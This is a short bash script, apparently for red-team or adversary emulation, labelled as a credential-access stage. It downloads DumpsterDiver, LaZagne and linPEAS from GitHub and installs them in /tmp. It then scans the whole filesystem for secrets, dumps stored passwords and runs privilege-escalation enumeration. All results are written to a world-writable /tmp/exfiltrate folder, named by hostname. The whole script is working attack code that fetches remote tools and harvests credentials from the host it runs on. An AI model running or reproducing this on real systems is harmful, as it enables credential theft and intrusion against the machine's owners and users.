#!/bin/bash

#Credential Access Execution Script
#Download tools
/bin/bash -c 'curl -L http://github.com/securing/DumpsterDiver/archive/master.tar.gz | tar zxf - -C /tmp'
/bin/bash -c 'cd /tmp/DumpsterDiver-master; python3 -m venv env; source "env/bin/activate"; pip3 install wheel; pip3 install -r requirements.txt'
/bin/bash -c 'curl -L http://github.com/AlessandroZ/LaZagne/archive/master.tar.gz | tar zxf - -C /tmp'
/bin/bash -c 'cd /tmp/LaZagne-master; python3 -m venv env; source "env/bin/activate"; pip3 install wheel python3-setuptools ; pip3 install -r requirements.txt'
/bin/bash -c 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh'
/bin/bash -c 'chmod +x /tmp/linpeas.sh'

#Create Exfiltration Folder
mkdir -m 777 /tmp/exfiltrate
mkdir -m 777 /tmp/exfiltrate/credentialAccess

#Dumpster Diver
/bin/bash -c 'cd /tmp/DumpsterDiver-master; source "env/bin/activate"; python3 DumpsterDiver.py -p / -s -o /tmp/exfiltrate/credentialAccess/DumpsterDiver-$HOSTNAME.$(date +%Y%m%d).json &'

#LaZagne
/bin/bash -c 'cd /tmp/LaZagne-master; source "env/bin/activate"; python3 Linux/laZagne.py all -v -oJ -output /tmp/exfiltrate/credentialAccess'
/bin/bash -c 'cd /tmp/exfiltrate/credentialAccess; mv credentials.json LaZagne-$HOSTNAME.$(date +%Y%m%d).json'

#linPEAS
sh /tmp/linpeas.sh -a -r >> /tmp/exfiltrate/credentialAccess/linPEAS-$HOSTNAME.$(date +%Y%m%d) 2>&1 &